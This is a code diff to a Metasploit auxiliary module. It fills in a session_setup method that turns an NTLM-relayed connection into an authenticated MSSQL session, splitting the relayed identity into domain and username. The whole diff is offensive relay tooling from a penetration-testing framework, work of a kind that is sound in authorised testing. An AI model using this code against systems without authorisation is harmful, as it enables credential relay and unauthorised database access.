@@ -87,6 +87,18 @@ class MetasploitModule < Msf::Auxiliary
   # @param [Msf::Exploit::Remote::SMB::Relay::NTLM::Target::MSSQL::Client] relay_connection
   # @return [Msf::Sessions::MSSQL]
   def session_setup(relay_connection, relay_identity)
-    # todo: write me
+    mssql_session = Msf::Sessions::MSSQL.new(
+      relay_connection.sock,
+      {
+        client: relay_connection,
+        **relay_connection.detect_platform_and_arch
+      }
+    )
+    domain, _, username = relay_identity.partition('\\')
+    datastore_options = {
+      'DOMAIN' => domain,
+      'USERNAME' => username
+    }
+    start_session(self, nil, datastore_options, false, mssql_session.rstream, mssql_session)
   end
 end
